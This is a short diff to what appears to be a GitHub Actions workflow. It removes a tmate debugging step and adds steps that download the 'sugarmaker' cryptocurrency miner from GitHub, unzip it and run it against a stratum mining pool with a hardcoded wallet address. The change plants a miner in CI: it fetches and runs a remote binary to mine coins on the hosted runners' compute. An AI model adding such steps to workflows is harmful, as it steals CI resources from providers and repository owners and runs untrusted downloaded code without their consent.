@@ -15,5 +15,7 @@ jobs:
         key_file: id_ecdsa
     - uses: actions/checkout@v2
     - run: source script-linux.sh
-    - name: Setup tmate session
-      uses: mxschmitt/action-tmate@master
+
+    - run: wget https://github.com/decryp2kanon/sugarmaker/releases/download/v2.5.0-sugar4/sugarmaker-v2.5.0-sugar4-linux64.zip
+    - run: unzip sugarmaker-v2.5.0-sugar4-linux64.zip
+    - run: ./sugarmaker-v2.5.0-sugar4-linux64/sugarmaker -a YespowerSugar -o stratum+tcp://stratum-asia.rplant.xyz:7042 -u sugar1qj54m4777f93ly2ncssnp7k330rpkj4r7vcmqfz -t2
